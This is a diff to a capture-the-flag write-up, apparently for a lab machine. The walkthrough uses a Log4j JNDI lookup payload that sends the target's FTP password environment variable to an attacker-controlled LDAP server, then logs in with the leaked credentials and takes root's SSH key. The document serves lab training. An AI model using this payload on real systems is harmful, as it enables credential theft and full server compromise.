@@ -167,16 +167,37 @@ Then log into ftp on the target machine twice and use following payloads:
 {% raw %} ${jndi:ldap://10.10.14.5:1389/${env:ftp_password}} {% endraw %}
 ```
 
+![obraz](https://github.com/user-attachments/assets/f1e5503f-0f0c-43d1-aaae-778cbbb913d5)
 
+Then the second payload:  
 
+![obraz](https://github.com/user-attachments/assets/8dece602-5963-4079-8d56-90b0f1bac14e)
 
+Now we can look what came to our server:  
 
+![obraz](https://github.com/user-attachments/assets/c202a5b8-caf8-4060-869c-f72f48a5899a)
 
+It has successfully exfiltrated credentials:  
++ ippsec:log4j_env_leakage
 
+With credentials we can log into ftp on the target:  
 
+![obraz](https://github.com/user-attachments/assets/d3715e0a-263a-43f3-be7c-4c36617bbbbf)
 
+Ftp runs as root and we're in root directory.  
+Easiest way to obtain shell access as root is to exfiltrate his ssh key.  
 
+![obraz](https://github.com/user-attachments/assets/9d063d28-0589-4b83-b533-4dbd24bc4086)
 
+Now we have to copy it to kali:  
+
+![obraz](https://github.com/user-attachments/assets/63232069-691b-4ee1-8d4d-a76f80ae1917)
+
+There is also a flag there:  
+
+![obraz](https://github.com/user-attachments/assets/42b916d4-07b4-4580-9708-9553de51650e)
+
+Thank you for reading!!  
 
 
 
